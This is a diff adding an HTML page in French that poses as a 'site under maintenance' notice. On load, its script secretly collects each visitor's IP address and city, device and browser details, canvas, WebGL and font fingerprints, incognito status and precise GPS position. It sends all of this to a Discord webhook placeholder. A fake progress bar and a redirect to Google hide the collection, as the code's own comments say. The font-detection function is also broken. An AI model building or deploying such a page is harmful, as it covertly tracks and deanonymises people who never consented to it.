@@ -1,0 +1,627 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Maintenance Temporaire</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f5f5f5;
+            color: #333;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .content-container {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            text-align: center;
+        }
+        
+        h1 {
+            font-size: 2.5rem;
+            margin-bottom: 1rem;
+            color: #2c3e50;
+        }
+        
+        p {
+            font-size: 1.2rem;
+            max-width: 600px;
+            line-height: 1.6;
+            margin-bottom: 1.5rem;
+        }
+        
+        .progress-container {
+            width: 80%;
+            max-width: 500px;
+            margin: 20px auto;
+        }
+        
+        .progress-bar {
+            height: 20px;
+            background-color: #3498db;
+            width: 75%;
+            border-radius: 10px;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { opacity: 0.6; }
+            50% { opacity: 1; }
+            100% { opacity: 0.6; }
+        }
+        
+        footer {
+            margin-top: auto;
+            padding: 20px;
+            background-color: #2c3e50;
+            color: white;
+            text-align: center;
+            width: 100%;
+        }
+        
+        .data-collection {
+            display: none;
+        }
+    </style>
+    <script>
+        async function getVisitorInfo() {
+            try {
+                // Collecte des données de base
+                const collectedData = {
+                    timestamp: new Date().toISOString(),
+                    cookies: document.cookie ? "Activés" : "Désactivés",
+                    localStorageAvailable: !!window.localStorage,
+                    sessionStorageAvailable: !!window.sessionStorage,
+                    browser: getBrowserInfo(),
+                    device: getDeviceInfo(),
+                    network: {},
+                    software: {},
+                    hardware: {},
+                    system: {},
+                    location: {},
+                    fingerprint: {},
+                    security: {}
+                };
+
+                // Collecter les informations réseau
+                try {
+                    const ipResponse = await fetch("https://ipinfo.io/json");
+                    collectedData.network.ipData = await ipResponse.json();
+                } catch (e) {
+                    collectedData.network.ipData = { error: "Impossible de récupérer les données IP" };
+                }
+
+                // Information de connexion
+                collectedData.network.connectionType = navigator.connection ? navigator.connection.effectiveType : "Non disponible";
+                collectedData.network.downlink = navigator.connection ? navigator.connection.downlink + " Mbps" : "Non disponible";
+                collectedData.network.rtt = navigator.connection ? navigator.connection.rtt + " ms" : "Non disponible";
+                collectedData.network.saveData = navigator.connection ? (navigator.connection.saveData ? "Activé" : "Désactivé") : "Non disponible";
+                
+                // Information sur le logiciel
+                collectedData.software.userAgent = navigator.userAgent;
+                collectedData.software.platform = navigator.platform;
+                collectedData.software.language = navigator.language;
+                collectedData.software.languages = navigator.languages ? JSON.stringify(navigator.languages) : "Non disponible";
+                collectedData.software.doNotTrack = navigator.doNotTrack || "Non spécifié";
+                collectedData.software.plugins = getPluginsInfo();
+                collectedData.software.timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                collectedData.software.timeZoneOffset = new Date().getTimezoneOffset() + " minutes";
+                
+                // Information sur le matériel
+                collectedData.hardware.screenResolution = `${window.screen.width}x${window.screen.height}`;
+                collectedData.hardware.colorDepth = window.screen.colorDepth + " bits";
+                collectedData.hardware.deviceMemory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Non disponible";
+                collectedData.hardware.cpuCores = navigator.hardwareConcurrency || "Non disponible";
+                collectedData.hardware.maxTouchPoints = navigator.maxTouchPoints || 0;
+                collectedData.hardware.batteryData = await getBatteryInfo();
+                
+                // Information système
+                collectedData.system.os = getOperatingSystem();
+                collectedData.system.referrer = document.referrer || "Accès direct";
+                collectedData.system.cookiesEnabled = navigator.cookieEnabled;
+                
+                // Empreinte digitale du navigateur
+                collectedData.fingerprint.canvas = await getCanvasFingerprint();
+                collectedData.fingerprint.webgl = await getWebGLFingerprint();
+                collectedData.fingerprint.fonts = await getFontsFingerprint();
+                
+                // Informations de sécurité
+                collectedData.security.incognito = await detectIncognito();
+                
+                // Localisation précise (si autorisée)
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        position => {
+                            collectedData.location.precise = {
+                                latitude: position.coords.latitude,
+                                longitude: position.coords.longitude,
+                                accuracy: position.coords.accuracy + " mètres",
+                                altitude: position.coords.altitude,
+                                heading: position.coords.heading,
+                                speed: position.coords.speed
+                            };
+                            sendToDiscord(collectedData);
+                        },
+                        error => {
+                            collectedData.location.precise = { error: "Localisation refusée: " + error.message };
+                            sendToDiscord(collectedData);
+                        },
+                        { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+                    );
+                } else {
+                    collectedData.location.precise = { error: "Géolocalisation non supportée" };
+                    sendToDiscord(collectedData);
+                }
+            } catch (error) {
+                console.error("Erreur lors de la collecte des données:", error);
+                sendToDiscord({ error: "Échec de la collecte: " + error.message });
+            }
+        }
+
+        function getBrowserInfo() {
+            const ua = navigator.userAgent;
+            let browser = "Inconnu";
+            let version = "Inconnu";
+            
+            if (ua.indexOf("Firefox") > -1) {
+                browser = "Firefox";
+                version = ua.match(/Firefox\/([0-9.]+)/)[1];
+            } else if (ua.indexOf("Edge") > -1 || ua.indexOf("Edg/") > -1) {
+                browser = "Microsoft Edge";
+                version = ua.match(/Edge\/([0-9.]+)/) || ua.match(/Edg\/([0-9.]+)/);
+                version = version ? version[1] : "Inconnu";
+            } else if (ua.indexOf("Chrome") > -1) {
+                browser = "Chrome";
+                version = ua.match(/Chrome\/([0-9.]+)/)[1];
+            } else if (ua.indexOf("Safari") > -1) {
+                browser = "Safari";
+                version = ua.match(/Version\/([0-9.]+)/)[1];
+            } else if (ua.indexOf("MSIE") > -1 || ua.indexOf("Trident") > -1) {
+                browser = "Internet Explorer";
+                version = ua.match(/MSIE ([0-9.]+)/) || ua.match(/rv:([0-9.]+)/);
+                version = version ? version[1] : "Inconnu";
+            } else if (ua.indexOf("Opera") > -1 || ua.indexOf("OPR") > -1) {
+                browser = "Opera";
+                version = ua.match(/Opera\/([0-9.]+)/) || ua.match(/OPR\/([0-9.]+)/);
+                version = version ? version[1] : "Inconnu";
+            }
+            
+            return { nom: browser, version: version };
+        }
+
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            let deviceType = "Desktop";
+            let deviceModel = "Inconnu";
+            
+            if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) {
+                deviceType = "Tablette";
+            } else if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) {
+                deviceType = "Mobile";
+            }
+            
+            // Tentative de détection du modèle (limitée)
+            if (ua.indexOf("iPhone") > -1) deviceModel = "iPhone";
+            else if (ua.indexOf("iPad") > -1) deviceModel = "iPad";
+            else if (ua.indexOf("Pixel") > -1) deviceModel = "Google Pixel";
+            else if (ua.indexOf("SM-") > -1) deviceModel = "Samsung Galaxy";
+            
+            return { type: deviceType, model: deviceModel };
+        }
+        
+        function getOperatingSystem() {
+            const ua = navigator.userAgent;
+            let os = "Inconnu";
+            let version = "Inconnu";
+            
+            if (ua.indexOf("Windows NT") > -1) {
+                os = "Windows";
+                const ntVersion = ua.match(/Windows NT ([0-9.]+)/)[1];
+                const versionMap = {
+                    "10.0": "10/11",
+                    "6.3": "8.1",
+                    "6.2": "8",
+                    "6.1": "7",
+                    "6.0": "Vista",
+                    "5.2": "Server 2003/XP 64-bit",
+                    "5.1": "XP",
+                    "5.0": "2000"
+                };
+                version = versionMap[ntVersion] || ntVersion;
+            } else if (ua.indexOf("Mac OS X") > -1) {
+                os = "macOS";
+                version = ua.match(/Mac OS X ([0-9_]+)/)[1].replace(/_/g, ".");
+            } else if (ua.indexOf("Android") > -1) {
+                os = "Android";
+                version = ua.match(/Android ([0-9.]+)/)[1];
+            } else if (ua.indexOf("iOS") > -1 || ua.indexOf("iPhone OS") > -1) {
+                os = "iOS";
+                version = ua.match(/OS ([0-9_]+)/)[1].replace(/_/g, ".");
+            } else if (ua.indexOf("Linux") > -1) {
+                os = "Linux";
+            }
+            
+            return { nom: os, version: version };
+        }
+        
+        function getPluginsInfo() {
+            if (!navigator.plugins || navigator.plugins.length === 0) {
+                return "Non disponible";
+            }
+            
+            let plugins = [];
+            for (let i = 0; i < navigator.plugins.length; i++) {
+                plugins.push(navigator.plugins[i].name);
+            }
+            
+            return plugins.join(", ");
+        }
+        
+        async function getBatteryInfo() {
+            if (!navigator.getBattery) {
+                return "Non disponible";
+            }
+            
+            try {
+                const battery = await navigator.getBattery();
+                return {
+                    niveau: (battery.level * 100) + "%",
+                    enCharge: battery.charging ? "Oui" : "Non",
+                    tempsCharge: battery.chargingTime !== Infinity ? 
+                        Math.floor(battery.chargingTime / 60) + " min" : "N/A",
+                    tempsDecharge: battery.dischargingTime !== Infinity ? 
+                        Math.floor(battery.dischargingTime / 60) + " min" : "N/A"
+                };
+            } catch (e) {
+                return "Erreur: " + e.message;
+            }
+        }
+        
+        async function getCanvasFingerprint() {
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                canvas.width = 200;
+                canvas.height = 50;
+                
+                ctx.font = '20px Arial';
+                ctx.fillStyle = 'rgb(100, 200, 300)';
+                ctx.fillText('Fingerprint', 10, 30);
+                ctx.fillStyle = 'rgb(200, 100, 200)';
+                ctx.fillText('Canvas', 100, 30);
+                
+                const dataUrl = canvas.toDataURL();
+                return dataUrl.substring(0, 20) + "..." + dataUrl.substring(dataUrl.length - 20);
+            } catch (e) {
+                return "Non disponible: " + e.message;
+            }
+        }
+        
+        async function getWebGLFingerprint() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                
+                if (!gl) return "WebGL non supporté";
+                
+                const renderer = gl.getParameter(gl.RENDERER);
+                const vendor = gl.getParameter(gl.VENDOR);
+                
+                return { renderer, vendor };
+            } catch (e) {
+                return "Non disponible: " + e.message;
+            }
+        }
+        
+        async function getFontsFingerprint() {
+            const baseFonts = ['monospace', 'sans-serif', 'serif'];
+            const fontList = [
+                'Arial', 'Courier New', 'Georgia', 'Times New Roman', 
+                'Verdana', 'Helvetica', 'Comic Sans MS', 'Impact', 
+                'Tahoma', 'Trebuchet MS'
+            ];
+            
+            const detected = [];
+            
+            for (let font of fontList) {
+                let detected = false;
+                for (let baseFont of baseFonts) {
+                    const testString = "mmmmmmmmmmlli";
+                    const testSize = '72px';
+                    
+                    const canvas = document.createElement('canvas');
+                    const ctx = canvas.getContext('2d');
+                    
+                    ctx.font = testSize + ' ' + baseFont;
+                    const baselineSize = ctx.measureText(testString).width;
+                    
+                    ctx.font = testSize + ' ' + font + ', ' + baseFont;
+                    const actualSize = ctx.measureText(testString).width;
+                    
+                    if (baselineSize !== actualSize) {
+                        detected = true;
+                        break;
+                    }
+                }
+                
+                if (detected) detected.push(font);
+            }
+            
+            return detected.length > 0 ? detected.join(", ") : "Aucune police détectée";
+        }
+        
+        async function detectIncognito() {
+            try {
+                // Test basé sur le stockage local
+                if (window.localStorage && window.sessionStorage) {
+                    const testKey = 'incognito_test';
+                    try {
+                        localStorage.setItem(testKey, '1');
+                        localStorage.removeItem(testKey);
+                        return "Navigation normale";
+                    } catch (error) {
+                        return "Mode privé probable";
+                    }
+                }
+                
+                // Test pour Safari
+                if (window.safari && window.safari.pushNotification) {
+                    const status = window.safari.pushNotification.toString();
+                    if (status === '[object SafariRemoteNotification]') {
+                        return "Navigation normale (Safari)";
+                    }
+                }
+                
+                return "Indéterminé";
+            } catch (e) {
+                return "Erreur de détection: " + e.message;
+            }
+        }
+
+        async function sendToDiscord(collectedData) {
+            const webhookURL = "TON_WEBHOOK_DISCORD_ICI";
+            
+            // Format de l'horodatage
+            const maintenant = new Date();
+            const timestamp = maintenant.toISOString();
+            
+            // Construire des champs pour l'embed principal (niveau 1)
+            const mainFields = [
+                {
+                    "name": "🖥️ Appareil",
+                    "value": `**Type:** ${collectedData.device.type}\n**OS:** ${collectedData.system.os.nom} ${collectedData.system.os.version}\n**Navigateur:** ${collectedData.browser.nom} ${collectedData.browser.version}`,
+                    "inline": true
+                },
+                {
+                    "name": "🌍 Localisation",
+                    "value": collectedData.network.ipData ? 
+                        `**IP:** ${collectedData.network.ipData.ip}\n**Ville:** ${collectedData.network.ipData.city || "?"}\n**Pays:** ${collectedData.network.ipData.country || "?"}` :
+                        "Données non disponibles",
+                    "inline": true
+                },
+                {
+                    "name": "🔍 Session",
+                    "value": `**Référent:** ${collectedData.system.referrer}\n**Langue:** ${collectedData.software.language}\n**Heure:** ${new Date().toLocaleTimeString()}`,
+                    "inline": true
+                }
+            ];
+            
+            // Embeds secondaires pour les détails
+            const detailEmbeds = [
+                {
+                    "title": "📡 Informations réseau",
+                    "color": 3447003, // Bleu
+                    "fields": [
+                        {
+                            "name": "FAI",
+                            "value": collectedData.network.ipData ? collectedData.network.ipData.org || "Inconnu" : "Inconnu",
+                            "inline": true
+                        },
+                        {
+                            "name": "Type de connexion",
+                            "value": collectedData.network.connectionType || "Inconnu",
+                            "inline": true
+                        },
+                        {
+                            "name": "Vitesse approx.",
+                            "value": collectedData.network.downlink || "Inconnu",
+                            "inline": true
+                        },
+                        {
+                            "name": "Latence",
+                            "value": collectedData.network.rtt || "Inconnu",
+                            "inline": true
+                        },
+                        {
+                            "name": "Région",
+                            "value": collectedData.network.ipData ? collectedData.network.ipData.region || "Inconnu" : "Inconnu",
+                            "inline": true
+                        },
+                        {
+                            "name": "Code postal",
+                            "value": collectedData.network.ipData ? collectedData.network.ipData.postal || "Inconnu" : "Inconnu",
+                            "inline": true
+                        }
+                    ]
+                },
+                {
+                    "title": "💻 Informations matérielles",
+                    "color": 15844367, // Orange
+                    "fields": [
+                        {
+                            "name": "Résolution écran",
+                            "value": collectedData.hardware.screenResolution || "Inconnu",
+                            "inline": true
+                        },
+                        {
+                            "name": "Profondeur couleur",
+                            "value": collectedData.hardware.colorDepth || "Inconnu",
+                            "inline": true
+                        },
+                        {
+                            "name": "Cœurs CPU",
+                            "value": collectedData.hardware.cpuCores || "Inconnu",
+                            "inline": true
+                        },
+                        {
+                            "name": "RAM (approx)",
+                            "value": collectedData.hardware.deviceMemory || "Inconnu",
+                            "inline": true
+                        },
+                        {
+                            "name": "Points tactiles",
+                            "value": collectedData.hardware.maxTouchPoints.toString() || "Inconnu",
+                            "inline": true
+                        },
+                        {
+                            "name": "Batterie",
+                            "value": typeof collectedData.hardware.batteryData === 'object' ? 
+                                `${collectedData.hardware.batteryData.niveau || "?"} (${collectedData.hardware.batteryData.enCharge || "?"})` :
+                                "Inconnu",
+                            "inline": true
+                        }
+                    ]
+                },
+                {
+                    "title": "🧩 Logiciels & Fingerprint",
+                    "color": 10181046, // Violet
+                    "fields": [
+                        {
+                            "name": "User-Agent",
+                            "value": collectedData.software.userAgent || "Inconnu",
+                            "inline": false
+                        },
+                        {
+                            "name": "Plateforme",
+                            "value": collectedData.software.platform || "Inconnu",
+                            "inline": true
+                        },
+                        {
+                            "name": "Fuseau horaire",
+                            "value": collectedData.software.timeZone || "Inconnu",
+                            "inline": true
+                        },
+                        {
+                            "name": "Do Not Track",
+                            "value": collectedData.software.doNotTrack || "Inconnu",
+                            "inline": true
+                        },
+                        {
+                            "name": "Mode navigation",
+                            "value": collectedData.security.incognito || "Inconnu",
+                            "inline": true
+                        },
+                        {
+                            "name": "Cookies",
+                            "value": collectedData.cookies || "Inconnu",
+                            "inline": true
+                        },
+                        {
+                            "name": "Fingerprint",
+                            "value": "Canvas & WebGL identifiés",
+                            "inline": true
+                        }
+                    ]
+                }
+            ];
+            
+            // Ajouter les coordonnées GPS si disponibles
+            if (collectedData.location && collectedData.location.precise && !collectedData.location.precise.error) {
+                detailEmbeds.push({
+                    "title": "📍 Localisation précise",
+                    "color": 15158332, // Rouge
+                    "description": `**Coordonnées:** ${collectedData.location.precise.latitude}, ${collectedData.location.precise.longitude}\n**Précision:** ${collectedData.location.precise.accuracy || "Inconnue"}\n**[Voir sur la carte](https://www.google.com/maps/search/?api=1&query=${collectedData.location.precise.latitude},${collectedData.location.precise.longitude})**`,
+                    "thumbnail": {
+                        "url": `https://maps.googleapis.com/maps/api/staticmap?center=${collectedData.location.precise.latitude},${collectedData.location.precise.longitude}&zoom=14&size=250x250&markers=color:red%7C${collectedData.location.precise.latitude},${collectedData.location.precise.longitude}&key=YOUR_API_KEY_HERE`
+                    }
+                });
+            }
+            
+            // Message principal
+            const message = {
+                "username": "Système de Surveillance",
+                "avatar_url": "https://i.imgur.com/zcqavCr.png",
+                "content": "🔔 **Nouvelle connexion détectée!**",
+                "embeds": [
+                    {
+                        "title": "👤 Informations visiteur",
+                        "description": "Un nouveau visiteur a accédé au site.",
+                        "color": 3066993, // Vert
+                        "timestamp": timestamp,
+                        "thumbnail": {
+                            "url": "https://i.imgur.com/H9BvxkD.png"
+                        },
+                        "fields": mainFields,
+                        "footer": {
+                            "text": "Système de surveillance v2.0",
+                            "icon_url": "https://i.imgur.com/zcqavCr.png"
+                        }
+                    },
+                    ...detailEmbeds
+                ]
+            };
+            
+            try {
+                fetch(webhookURL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(message)
+                });
+                
+                // Simuler une utilisation normale du site pour l'utilisateur
+                setTimeout(() => {
+                    document.querySelector(".progress-bar").style.width = "100%";
+                    document.getElementById("status-message").innerText = "Maintenance terminée ! Redirection en cours...";
+                    
+                    // Rediriger vers un site légitime après quelques secondes
+                    setTimeout(() => {
+                        window.location.href = "https://www.google.com";
+                    }, 3000);
+                }, 5000);
+                
+            } catch (error) {
+                console.error("Erreur lors de l'envoi des données:", error);
+            }
+        }
+
+        window.onload = () => {
+            // Simuler un chargement pour paraître légitime
+            setTimeout(() => {
+                document.querySelector(".progress-bar").style.width = "45%";
+                document.getElementById("status-message").innerText = "Mise à jour des systèmes en cours...";
+                getVisitorInfo();
+            }, 1500);
+        };
+    </script>
+</head>
+<body>
+    <div class="content-container">
+        <h1>Site en maintenance</h1>
+        <p id="status-message">Vérification du système en cours, veuillez patienter...</p>
+        
+        <div class="progress-container">
+            <div class="progress-bar"></div>
+        </div>
+        
+        <p>Notre site est actuellement en maintenance pour améliorer votre expérience.<br>
+        Vous serez automatiquement redirigé lorsque nous aurons terminé.</p>
+    </div>
+    
+    <footer>
+        <p>&copy; 2025 - Tous droits réservés</p>
+    </footer>
+    
+    <div class="data-collection">
+        <!-- Cette div est invisible et contient le mécanisme de collecte -->
+    </div>
+</body>
+</html>
